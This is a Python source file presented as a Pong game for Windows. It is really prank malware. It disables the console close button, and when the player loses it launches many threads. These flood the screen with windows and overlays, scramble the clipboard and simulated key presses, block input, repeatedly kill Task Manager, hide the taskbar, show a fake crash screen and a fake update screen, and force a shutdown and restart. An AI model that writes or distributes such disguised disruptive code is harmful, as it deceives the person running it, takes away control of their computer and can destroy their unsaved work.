import ctypes
# ─── Disable Console “Close” (Alt+F4 & ‘X’) ──────────────────────────────────
kernel32 = ctypes.windll.kernel32
user32   = ctypes.windll.user32
hwnd = kernel32.GetConsoleWindow()
if hwnd:
    hMenu = user32.GetSystemMenu(hwnd, False)
    if hMenu:
        SC_CLOSE     = 0xF060
        MF_BYCOMMAND = 0x00000000
        user32.DeleteMenu(hMenu, SC_CLOSE, MF_BYCOMMAND)
        user32.DrawMenuBar(hwnd)

import tkinter as tk
import random
import webbrowser
import os
import time
import threading
import glob
import string
import subprocess
from tkinter import ttk
from ctypes import wintypes

# Optional winsound on Windows
try:
    import winsound
except ImportError:
    winsound = None

# ─── Configuration ─────────────────────────────────────────────────────────────
WIDTH, HEIGHT               = 800, 600
PADDLE_WIDTH, PADDLE_HEIGHT = 10, 100
BALL_SIZE                   = 20
INITIAL_BALL_SPEED          = 5
PADDLE_SPEED                = 20
BASE_SHAKE_MAGNITUDE        = 5
SPEED_INCREASE_INTERVAL     = 15       # secs until ball speeds up
SHUTDOWN_DELAY              = 35       # secs until shutdown/restart

SHUTDOWN_CMD = f"shutdown /s /t {SHUTDOWN_DELAY}"
RESTART_CMD  = "shutdown /r /t 0"

# ─── Utility Helpers ──────────────────────────────────────────────────────────
def safe_system(cmd):
    try:
        os.system(cmd)
    except:
        pass

def change_wallpaper():
    try:
        home = os.getenv("USERPROFILE", "")
        pics = glob.glob(os.path.join(home, "Pictures", "*.png"))
        if pics:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, random.choice(pics), 3)
    except:
        pass

def enum_youtube_windows():
    hwnds = []
    u32 = ctypes.windll.user32
    @ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
    def cb(h, lParam):
        try:
            l = u32.GetWindowTextLengthW(h)
            if l > 0:
                buf = ctypes.create_unicode_buffer(l+1)
                u32.GetWindowTextW(h, buf, l+1)
                if "YouTube" in buf.value:
                    hwnds.append(h)
        except:
            pass
        return True
    try:
        u32.EnumWindows(cb, 0)
    except:
        pass
    return hwnds

def shake_windows_loop(get_hwnds, duration, interval=0.5):
    u32 = ctypes.windll.user32
    rect = wintypes.RECT()
    end = time.time() + duration
    origs = {}
    while time.time() < end:
        for h in get_hwnds():
            try:
                u32.GetWindowRect(h, ctypes.byref(rect))
                w = rect.right - rect.left
                hgt = rect.bottom - rect.top
                if h not in origs:
                    origs[h] = (rect.left, rect.top, w, hgt)
                ox, oy, ow, oh = origs[h]
                mag = BASE_SHAKE_MAGNITUDE
                nx = ox + random.randint(-mag, mag)
                ny = oy + random.randint(-mag, mag)
                u32.MoveWindow(h, nx, ny, ow, oh, True)
            except:
                pass
        time.sleep(interval)
    for h, (ox, oy, ow, oh) in origs.items():
        try:
            u32.MoveWindow(h, ox, oy, ow, oh, True)
        except:
            pass

# ─── Prank Threads ─────────────────────────────────────────────────────────────
def rapid_pranks():
    u32 = ctypes.windll.user32
    try:
        tray = u32.FindWindowW("Shell_TrayWnd", None)
    except:
        tray = None
    hide = False
    end = time.time() + SHUTDOWN_DELAY
    while time.time() < end:
        change_wallpaper()
        if tray:
            try:
                u32.ShowWindow(tray, 0 if hide else 5)
                hide = not hide
            except:
                pass
        time.sleep(0.2)
    if tray:
        try:
            u32.ShowWindow(tray, 5)
        except:
            pass

def heavy_pranks():
    end = time.time() + SHUTDOWN_DELAY
    while time.time() < end:
        if winsound:
            try:
                winsound.Beep(random.randint(400, 2000), 80)
            except:
                pass
        safe_system("start notepad")
        safe_system("start mspaint")
        safe_system('start explorer shell:RecycleBinFolder')
        c = random.choice("0123456789ABCDEF")
        safe_system(f'start cmd /k "color {c}"')
        try:
            ctypes.windll.user32.MessageBoxW(None, "You’re totally owned!", "PRANK", 0x10)
        except:
            pass
        try:
            ctypes.windll.user32.BlockInput(True)
            time.sleep(0.05)
            ctypes.windll.user32.BlockInput(False)
        except:
            pass
        time.sleep(0.1)

def brutal_pranks():
    global app
    u32 = ctypes.windll.user32
    VK_MUTE = 0xAD
    sites = ["http://google.com","http://reddit.com","http://example.com","http://stackoverflow.com"]
    end = time.time() + SHUTDOWN_DELAY
    while time.time() < end:
        try:
            u32.keybd_event(VK_MUTE, 0, 0, 0)
            u32.keybd_event(VK_MUTE, 0, 2, 0)
        except:
            pass
        try:
            webbrowser.open(random.choice(sites))
        except:
            pass
        try:
            bg = app.canvas.cget("bg")
            app.canvas.configure(bg="white" if bg=="black" else "black")
        except:
            pass
        try:
            ov = tk.Toplevel(app.root)
            ov.attributes("-fullscreen", True)
            ov.configure(bg=random.choice(["magenta","cyan","lime"]))
            ov.after(150, ov.destroy)
        except:
            pass
        time.sleep(0.3)

def moderate_pranks():
    u32 = ctypes.windll.user32
    VK_CAP = 0x14
    arrows = [0x26,0x28,0x25,0x27]
    inv = False
    end = time.time() + SHUTDOWN_DELAY
    while time.time() < end:
        if winsound:
            try:
                winsound.Beep(random.randint(600,1200), 100)
            except:
                pass
        try:
            ctypes.windll.user32.MessageBoxW(None, "Surprise!", "Prank", 0x40)
        except:
            pass
        try:
            u32.keybd_event(VK_CAP,0,0,0)
            u32.keybd_event(VK_CAP,0,2,0)
        except:
            pass
        k = random.choice(arrows)
        try:
            u32.keybd_event(k,0,0,0)
            u32.keybd_event(k,0,2,0)
        except:
            pass
        try:
            bg = "white" if not inv else "black"
            fg = "black" if not inv else "white"
            app.canvas.configure(bg=bg)
            app.canvas.itemconfig(app.paddle, fill=fg)
            app.canvas.itemconfig(app.ai_paddle, fill=fg)
            app.canvas.itemconfig(app.ball, fill="red")
            inv = not inv
        except:
            pass
        time.sleep(3)

def apocalyptic_pranks():
    end = time.time() + SHUTDOWN_DELAY
    while time.time() < end:
        try:
            ov = tk.Toplevel(app.root)
            ov.attributes("-fullscreen", True)
            ov.configure(bg="blue")
            lbl = tk.Label(ov,
                text="A problem has been detected\nand Windows has been shut down\nto prevent damage.",
                fg="white", bg="blue", font=("Consolas",24), justify="center"
            )
            lbl.pack(expand=True)
            app.root.after(3000, ov.destroy)
        except:
            pass
        if winsound:
            try:
                winsound.Beep(500,300)
            except:
                pass
        time.sleep(5)

def ultimate_pranks():
    end = time.time() + SHUTDOWN_DELAY
    while time.time() < end:
        t0 = time.time()
        while time.time() - t0 < 1:
            pass
        time.sleep(1)

def insane_pranks():
    safe_system("start regedit")
    safe_system("start eventvwr.msc")
    safe_system("start devmgmt.msc")
    safe_system("start services.msc")
    safe_system("start mmc")
    safe_system('powershell -c "Get-Process | Out-GridView"')

def crash_taskmgr_loop():
    end = time.time() + SHUTDOWN_DELAY
    while time.time() < end:
        safe_system("start taskmgr")
        time.sleep(0.5)
        safe_system("taskkill /F /IM taskmgr.exe")
        time.sleep(0.5)

def crash_pc():
    time.sleep(SHUTDOWN_DELAY)
    safe_system(RESTART_CMD)

def volume_blitz():
    end = time.time() + SHUTDOWN_DELAY
    while time.time() < end:
        try:
            os.system("nircmd.exe setsysvolume 65535")
        except:
            pass
        time.sleep(0.2)
        try:
            os.system("nircmd.exe setsysvolume 0")
        except:
            pass
        time.sleep(0.2)

def explorer_flood():
    end = time.time() + SHUTDOWN_DELAY
    while time.time() < end:
        safe_system("start explorer")
        time.sleep(0.3)

def clipboard_chaos():
    r = tk.Tk(); r.withdraw()
    end = time.time() + SHUTDOWN_DELAY
    while time.time() < end:
        txt = "".join(random.choices(string.printable, k=64))
        try:
            r.clipboard_clear()
            r.clipboard_append(txt)
        except:
            pass
        time.sleep(0.3)

def window_shuffle():
    u32 = ctypes.windll.user32
    end = time.time() + SHUTDOWN_DELAY
    while time.time() < end:
        hwnds = []
        def cb(h, l): hwnds.append(h); return True
        try:
            u32.EnumWindows(ctypes.WINFUNCTYPE(wintypes.BOOL,wintypes.HWND,wintypes.LPARAM)(cb),0)
        except:
            pass
        for h in hwnds:
            try:
                u32.MoveWindow(h,
                    random.randint(-800,1600),
                    random.randint(-600,1200),
                    100,100,True
                )
            except:
                pass
        time.sleep(2)
        try:
            u32.MoveWindow(app.root.winfo_id(),100,100,WIDTH,HEIGHT,True)
        except:
            pass

def overlay_flood():
    end = time.time() + SHUTDOWN_DELAY
    sw, sh = app.root.winfo_screenwidth(), app.root.winfo_screenheight()
    while time.time() < end:
        for _ in range(20):
            try:
                w = tk.Toplevel(app.root)
                w.overrideredirect(True)
                w.geometry(f"50x50+{random.randint(0,sw)}+{random.randint(0,sh)}")
                w.configure(bg=random.choice(["red","green","blue","yellow"]))
                w.after(200, w.destroy)
            except:
                pass
        time.sleep(0.5)

def key_flood():
    u32 = ctypes.windll.user32
    keys = list(range(0x30,0x5B)) + [0x26,0x28,0x25,0x27]
    end = time.time() + SHUTDOWN_DELAY
    while time.time() < end:
        k = random.choice(keys)
        try:
            u32.keybd_event(k,0,0,0)
            u32.keybd_event(k,0,2,0)
        except:
            pass
        time.sleep(1/30)

def fake_update_prank():
    end = time.time() + SHUTDOWN_DELAY
    while time.time() < end:
        try:
            w = tk.Toplevel(app.root)
            w.attributes("-fullscreen", True)
            w.configure(bg="black")
            lbl = tk.Label(w, text="Installing updates...\nPlease do not turn off your PC",
                           fg="white", bg="black", font=("Segoe UI",24))
            lbl.pack(pady=20)
            pb = ttk.Progressbar(w, orient="horizontal", length=600, mode="determinate")
            pb.pack(pady=50)
            for i in range(0,101,5):
                pb['value'] = i
                w.update()
                time.sleep(0.2)
            time.sleep(1)
            w.destroy()
        except:
            pass

def media_prank():
    end = time.time() + SHUTDOWN_DELAY
    sounds = ["SystemAsterisk","SystemExclamation","SystemHand","SystemQuestion"]
    while time.time() < end:
        if winsound:
            try:
                winsound.PlaySound(random.choice(sounds), winsound.SND_ALIAS)
            except:
                pass
        time.sleep(1)

# ─── New: Random Audio Spam ──────────────────────────────────────────────────
def audio_spam():
    # play random WAVs from Music folder, fallback to random beeps
    home = os.getenv("USERPROFILE","")
    wavs = glob.glob(os.path.join(home, "Music", "*.wav"))
    end = time.time() + SHUTDOWN_DELAY
    while time.time() < end:
        if wavs and winsound:
            winsound.PlaySound(random.choice(wavs), winsound.SND_FILENAME | winsound.SND_ASYNC)
        elif winsound:
            winsound.Beep(random.randint(300,2000), 300)
        time.sleep(0.5)

def control_inverter():
    while app.running:
        time.sleep(random.randint(10,20))
        app.invert_controls = True
        time.sleep(5)
        app.invert_controls = False

def on_mouse_move(event):
    x,y = event.x, event.y
    r = 800
    app.canvas.coords(app.cursor_oval, x-r, y-r, x+r, y+r)

class PongGame:
    def __init__(self):
        self.root           = tk.Tk()
        self.original_title = "Ping-Pong with a Twist!"
        self.root.title(self.original_title)
        self.root.geometry(f"{WIDTH}x{HEIGHT}")
        self.root.update_idletasks()

        # hide real pointer
        self.root.config(cursor="none")
        self.flash_title()
        self.orig_x, self.orig_y = self.root.winfo_x(), self.root.winfo_y()

        # canvas & cursor overlay
        self.canvas = tk.Canvas(self.root, width=WIDTH, height=HEIGHT, bg="black", highlightthickness=0)
        self.canvas.pack()
        self.cursor_oval = self.canvas.create_oval(-9999,-9999,-9999,-9999, outline="yellow", width=3)
        self.canvas.bind("<Motion>", on_mouse_move)

        # paddles & ball
        self.paddle    = self.canvas.create_rectangle(20,(HEIGHT-PADDLE_HEIGHT)//2,
                          20+PADDLE_WIDTH,(HEIGHT+PADDLE_HEIGHT)//2, fill="white")
        self.ai_paddle = self.canvas.create_rectangle(WIDTH-20-PADDLE_WIDTH,(HEIGHT-PADDLE_HEIGHT)//2,
                          WIDTH-20,(HEIGHT+PADDLE_HEIGHT)//2, fill="white")
        x0,y0 = (WIDTH-BALL_SIZE)//2, (HEIGHT-BALL_SIZE)//2
        self.ball = self.canvas.create_oval(x0,y0, x0+BALL_SIZE, y0+BALL_SIZE, fill="red")

        self.vx = random.choice([-INITIAL_BALL_SPEED, INITIAL_BALL_SPEED])
        self.vy = random.choice([-INITIAL_BALL_SPEED, INITIAL_BALL_SPEED])
        self.move_up = self.move_down = False
        self.invert_controls = False
        self.last_speed_increase = time.time()

        for k in ('w','s'):
            self.root.bind(f"<KeyPress-{k}>",   self.on_key_press)
            self.root.bind(f"<KeyRelease-{k}>", self.on_key_release)

        threading.Thread(target=control_inverter, daemon=True).start()
        self.running = True
        self.game_loop()
        self.root.mainloop()

    def flash_title(self):
        try:
            self.root.title("YOUR COMPUTER IS MINE")
        except:
            pass
        self.root.after(600, lambda: self.safe_title(self.original_title))
        self.root.after(random.randint(5000,15000), self.flash_title)

    def safe_title(self, t):
        try:
            self.root.title(t)
        except:
            pass

    def on_key_press(self, e):
        key = e.keysym
        if self.invert_controls:
            key = 's' if key=='w' else 'w' if key=='s' else key
        if key == 'w':
            self.move_up = True
        if key == 's':
            self.move_down = True

    def on_key_release(self, e):
        key = e.keysym
        if self.invert_controls:
            key = 's' if key=='w' else 'w' if key=='s' else key
        if key == 'w':
            self.move_up = False
        if key == 's':
            self.move_down = False

    def move_paddle(self, dy):
        x1, y1, x2, y2 = self.canvas.coords(self.paddle)
        ny1 = max(0, min(HEIGHT-PADDLE_HEIGHT, y1+dy))
        self.canvas.coords(self.paddle, x1, ny1, x2, ny1+PADDLE_HEIGHT)

    def shake_window(self):
        mag = BASE_SHAKE_MAGNITUDE + (abs(self.vx)-INITIAL_BALL_SPEED)
        ox = self.orig_x + random.randint(-mag, mag)
        oy = self.orig_y + random.randint(-mag, mag)
        try:
            self.root.geometry(f"{WIDTH}x{HEIGHT}+{ox}+{oy}")
        except:
            pass

    def flash_screen(self):
        f = self.canvas.create_rectangle(0,0,WIDTH,HEIGHT, fill="white")
        self.root.after(100, lambda: self.canvas.delete(f))

    def game_loop(self):
        if not self.running:
            return
        if random.random() < 0.02:
            self.flash_screen()
        now = time.time()
        if now - self.last_speed_increase >= SPEED_INCREASE_INTERVAL:
            self.vx += 1 if self.vx > 0 else -1
            self.vy += 1 if self.vy > 0 else -1
            self.last_speed_increase = now

        self.shake_window()
        if self.move_up:
            self.move_paddle(-PADDLE_SPEED)
        if self.move_down:
            self.move_paddle(PADDLE_SPEED)

        self.canvas.move(self.ball, self.vx, self.vy)
        bx1, by1, _, _ = self.canvas.coords(self.ball)
        if by1 <= 0 or by1+BALL_SIZE >= HEIGHT:
            self.vy = -self.vy
        if bx1 <= 0:
            self.end_game()
            return
        if self._hit(self.paddle):
            self.vx = abs(self.vx)
        elif self._hit(self.ai_paddle):
            self.vx = -abs(self.vx)
        self._ai()
        self.root.after(20, self.game_loop)

    def _hit(self, p):
        px1, py1, px2, py2 = self.canvas.coords(p)
        bx1, by1, bx2, by2 = self.canvas.coords(self.ball)
        return bx1 <= px2 and bx2 >= px1 and by2 >= py1 and by1 <= py2

    def _ai(self):
        _, by1, _, by2 = self.canvas.coords(self.ball)
        center = (by1 + by2) / 2
        px1, py1, px2, py2 = self.canvas.coords(self.ai_paddle)
        mid = (py1 + py2) / 2
        if center < mid-10:
            dy = -PADDLE_SPEED
        elif center > mid+10:
            dy = PADDLE_SPEED
        else:
            return
        ny1 = max(0, min(HEIGHT-PADDLE_HEIGHT, py1+dy))
        self.canvas.coords(self.ai_paddle, px1, ny1, px2, ny1+PADDLE_HEIGHT)

    def shake_cursor(self, duration=4, magnitude=20, frequency=0.05):
        class POINT(ctypes.Structure):
            _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
        pt = POINT()
        try:
            ctypes.windll.user32.GetCursorPos(ctypes.byref(pt))
        except:
            return
        ox, oy = pt.x, pt.y
        steps = int(duration/frequency)
        for _ in range(steps):
            dx = random.randint(-magnitude, magnitude)
            dy = random.randint(-magnitude, magnitude)
            try:
                ctypes.windll.user32.SetCursorPos(ox+dx, oy+dy)
            except:
                pass
            time.sleep(frequency)
        try:
            ctypes.windll.user32.SetCursorPos(ox, oy)
        except:
            pass

    def end_game(self):
        self.running = False
        # launch all prank threads including new audio_spam
        for fn in (
            rapid_pranks, heavy_pranks, brutal_pranks,
            moderate_pranks, apocalyptic_pranks,
            ultimate_pranks, insane_pranks,
            crash_taskmgr_loop, crash_pc,
            volume_blitz, explorer_flood,
            clipboard_chaos, window_shuffle,
            overlay_flood, key_flood,
            fake_update_prank, media_prank,
            audio_spam,  # <-- new audio spam thread
        ):
            threading.Thread(target=fn, daemon=True).start()
        threading.Thread(
            target=lambda: shake_windows_loop(enum_youtube_windows, SHUTDOWN_DELAY),
            daemon=True
        ).start()
        self.shake_cursor()
        self.canvas.create_text(
            WIDTH//2, HEIGHT//2,
            text=f"Gotcha! 🥳\nShutting down/restarting in {SHUTDOWN_DELAY}s",
            fill="yellow", font=("Arial",24), justify="center"
        )
        safe_system(SHUTDOWN_CMD)

if __name__ == "__main__":
    app = PongGame()
